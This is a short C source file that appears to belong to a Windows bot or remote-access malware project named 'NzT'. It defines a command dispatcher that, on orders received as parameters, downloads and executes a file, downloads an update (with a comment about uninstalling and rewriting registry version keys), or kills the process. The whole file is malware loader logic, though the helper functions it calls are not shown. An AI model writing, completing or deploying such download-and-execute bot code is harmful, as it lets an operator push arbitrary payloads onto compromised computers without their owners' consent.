#include <Windows.h>
#ifdef _DEBUG
#include <stdio.h>
#endif

#include "nzt.h"
#include "command.h"
#include "utils.h"

VOID CommandExecute(
	COMMANDS Command, 
	PCHAR*	 Parameter
)
{
	DebugPrint("NzT: Executed command: %d %s", Command, Parameter[2]);

	switch (Command)
	{
		case COMMAND_DL_EXEC:
		{
			DownloadFile(Parameter[2], TRUE);
			break;
		}

		case COMMAND_UPDATE:
		{
			DownloadFile(Parameter[2], TRUE);
			//uninstall and update registry key values to hold new version number
			break;
		}

		case COMMAND_KILL:
			API(ExitProcess(0));
	}
}